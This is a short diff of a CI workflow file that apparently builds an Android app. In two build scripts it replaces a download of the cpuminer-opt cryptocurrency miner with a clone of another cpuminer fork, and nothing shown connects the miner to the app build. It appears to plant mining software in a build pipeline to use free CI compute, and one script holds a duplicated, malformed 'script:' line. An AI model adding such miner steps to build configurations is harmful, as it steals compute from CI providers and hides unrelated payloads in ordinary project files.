@@ -22,11 +22,11 @@ workflows:
     scripts:
       - name: script_1
         script: |
-                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+                git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git 
       - name: script_2
         script: |
                 script: |
-                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
+                git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git 
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
